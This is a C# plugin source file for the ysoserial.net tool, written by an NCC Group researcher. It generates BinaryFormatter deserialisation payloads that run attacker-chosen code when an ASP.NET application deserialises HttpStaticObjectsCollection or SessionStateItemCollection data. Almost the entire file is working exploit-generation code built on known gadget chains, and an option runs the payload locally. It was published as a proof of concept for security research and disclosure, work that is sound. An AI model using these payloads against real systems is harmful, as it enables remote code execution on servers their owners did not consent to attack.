using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial_frmv2.Generators;
using System.IO;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `HttpStaticObjectsCollection.Deserialize(BinaryReader) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.web.httpstaticobjectscollection.deserialize and 
 *      `SessionStateItemCollection.Item[String] Property`: https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionstateitemcollection.item 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  The affected modules accept input type of BinaryReader
 **/

namespace ysoserial_frmv2.Plugins
{
    class altserializationPlugin : Plugin
    {
        static string format = "";
        static string mode = "";
        static string command = "";
        static Boolean test = false;

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: HttpStaticObjectsCollection or SessionStateItemCollection. Default: HttpStaticObjectsCollection", v => mode = v },
                {"o|output=", "the output format (raw|base64).", v => format = v },
                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\" ", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
            };

        public string Name()
        {
            return "altserialization";
        }

        public string Description()
        {
            return "Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            object payload = "";
            if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (mode.ToLower().Equals("sessionstateitemcollection"))
            {
                /* I decided to change the TypeConfuseDelegateGenerator class and use its gadget instead of doing this through the following hacky way */

                /* hacky way begin
                byte[] tempPayload_init = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
                byte[] tempPayload = new byte[tempPayload_init.Length + 1]; // adding one byte initially to fix the length problem
                tempPayload_init.CopyTo(tempPayload, 0);
                System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                items[""] = tempPayload;
                MemoryStream stream = new MemoryStream();
                BinaryWriter writer = new BinaryWriter(stream);
                items.Serialize(writer);
                stream.Flush();
                tempPayload = stream.ToArray();
                byte[] newSerializedData = new byte[tempPayload.Length-27-1-1]; // yes don't ask about the numbers! it's magical!
                Array.Copy(tempPayload, 0, newSerializedData, 0, 9); // reading first 9 bytes
                Array.Copy(tempPayload, 36, newSerializedData, 9, tempPayload.Length-27-1-9-1); // ignoring 27 bytes after 9 bytes + reading the rest + ignoring the last byte
                newSerializedData[13] = 20; // for ReadByte - 20 is the type that will be deserialized in AltSerialization.ReadValueFromStream
                // hacky way ends */

                /* here it is using the sane way! */
                object serializedData = (object)new PayloadClass();
                System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                items[""] = serializedData;
                MemoryStream stream = new MemoryStream();
                BinaryWriter writer = new BinaryWriter(stream);
                items.Serialize(writer);
                stream.Flush();
                payload = stream.ToArray();

                if (test)
                {
                    // PoC on how it works in practice
                    stream = new MemoryStream((byte[])payload);
                    BinaryReader binReader = new BinaryReader(stream);
                    System.Web.SessionState.SessionStateItemCollection test = System.Web.SessionState.SessionStateItemCollection.Deserialize(binReader);
                    test.GetEnumerator();
                }
            }
            else
            {
                // HttpStaticObjectsCollection
                byte[] serializedData = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
                byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                serializedData.CopyTo(newSerializedData, 7);
                newSerializedData[0] = 1; // for ReadInt32
                newSerializedData[5] = 1; // for ReadBoolean
                newSerializedData[6] = 20; // for ReadByte - 20 is the type that will be deserialized in AltSerialization.ReadValueFromStream

                payload = newSerializedData;

                if (test)
                {
                    // PoC on how it works in practice
                    MemoryStream stream = new MemoryStream((byte[]) payload);
                    BinaryReader binReader = new BinaryReader(stream);
                    System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
                }
            }

            return payload;
        }
    }
}
